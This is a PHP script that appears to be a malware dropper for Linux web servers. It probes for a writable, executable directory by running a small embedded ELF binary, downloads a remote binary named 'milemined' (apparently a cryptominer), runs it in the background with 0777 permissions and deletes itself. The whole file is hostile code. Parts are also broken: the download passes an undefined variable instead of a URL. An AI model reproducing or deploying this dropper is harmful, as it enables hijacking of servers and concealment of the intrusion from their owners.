<?php
$drop_name = 'milemined';

function http_get($url) {
	$p = parse_url($url);
	$host = $p["host"];
	$path = $p["path"];
	$port = $p["port"];
	$f = @fsockopen($host, $port, $errno, $errstr, 30);
	if (! $f)
		return false;
	fwrite($f, "GET ".$path." HTTP/1.0\r\nHost: ".$host."\r\nConnection: Close\r\n\r\n");
	$resp = "";
	while (! feof($f)) {
		$resp .= fgets($f, 128);
	}
	fclose($f);
	if (($p = strpos($resp, "\r\n\r\n")) !== false) {
		$h = substr($resp, 0, $p);
		$r = substr($resp, $p + 4);
		return $r;
	}
}

function proc_list()
{
	global $ps;
	$list[] = array();
	if (($d = opendir('/proc'))) {
		while ($r = readdir($d)) {
			if (is_numeric($r)) {
				$name = trim(@file_get_contents('/proc/'.$r.'/comm'));
				if (strlen($name))
					$list[$r] = $name;
			}
		}
		closedir($d);
	}
	$ps = $list;
	return $list;
}

function is_running($name)
{
	global $ps;
	return array_search($name, $ps);
}

function get_file($url) {
	$p = parse_url($url);
	return basename($p["path"]);
}

function load_url($url) {
	$file = get_file($url);
}

function error($status, $text) {
	print "DEADBEEF:".($status == true ? "OK" : "ERROR").":".$text.":\n";
	unlink(basename($_SERVER["PHP_SELF"]));
	exit(0);
}

function get_exec_local($p, $n)
{
	if (file_exists($p.$n))
		return $p.$n;
	return false;
}

function drop_file($path, $text)
{
	$f = fopen($path, "x");
	if ($f) {
		fwrite($f, $text);
		fclose($f);
		chmod($path, 0777);
	}
}

$path = array('/dev/shm/', '/tmp/', './');
if (php_uname('s') != 'Linux')
	error(false, 'Not a Linux system');
if (php_uname('m') != 'x86_64')
	error(false, 'Not compatible with x86_64');
if (count(proc_list()) < 2)
	error(false, 'Failed to get proccess list');
if (is_running($drop_name))
	error(true, 'Already running');
$file = false;
foreach ($path as $p) {
	if (($file = get_exec_local($p, $drop_name)) !== false) {
		break;
	}
}
if ($file == false) {
	// get exec path
	$te = base64_decode("f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAgABAAAAAAABAAAAAAAAAAMAAAAAAAAAAAAAAAEAAOAABAEAABQACAAEAAAAHAAAAgAAAAAAAAACAAEAAAAAAAIAAQAAAAAAAHgAAAAAAAAAeAAAAAAAAABAAAAAAAAAAAAAAAAAAAABIv2MAAAAAAAAASDHASP/ADwVIuDwAAAAAAAAADwU=");
	$exec_path = false;
	foreach ($path as $p) {
		drop_file($p."te", $te);
		@exec($p."te", $out, $ret);
		@unlink($p."te");
		if ($ret == 99) {
			$exec_path = $p;
			break;
		}
	}
	if ($exec_path === false)
		error(false, "No exec path");
	$te = http_get($drop_file);
	if ($te[0] != 0x7f)
		error(false, 'ELF corrupted');
	if ($te === false)
		error(false, 'Failed to download');
	$file = $exec_path.$drop_name;
	drop_file($file, $te);
}
@chmod($file, 0777);
// use at/cron here
@exec($file." -B >/dev/null &");
// print status
sleep(1);
proc_list();
if (is_running($drop_name))
	error(true, 'RUNNING '.$file);
error(false, 'SOMETHING GOES WRONG');

